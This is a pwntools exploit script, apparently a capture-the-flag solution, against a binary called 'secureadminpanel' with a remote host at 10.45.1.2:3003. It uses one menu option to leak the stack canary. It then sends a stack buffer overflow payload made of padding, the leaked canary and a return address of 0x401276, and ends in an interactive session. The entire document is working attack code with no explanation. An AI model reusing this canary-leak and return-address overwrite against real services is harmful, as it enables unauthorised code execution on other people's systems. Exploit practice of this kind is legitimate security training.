from pwn import *

elf = context.binary = ELF('./secureadminpanel')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("10.45.1.2", 3003)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()

conn.recvuntil(b'Choice:')
conn.sendline(b'1')
conn.recvuntil(b'your name:')
name = p64(1094861636) * 6
print(name)
print(len(name))
conn.sendline(name)
conn.recvuntil(b'Choice:')
conn.sendline(b'2')
conn.recvuntil(b'ino: ')
canary = conn.recvline().decode().strip()
print(f'canary: {canary}')
conn.recvuntil(b'Choice:')
conn.sendline(b'3')
payload = b'A' *  24 + p64(int(canary, 16)) + b'A'*8 + p64(0x401276)
print(payload)
conn.recvuntil(b'ack:')
conn.sendline(payload)
conn.interactive()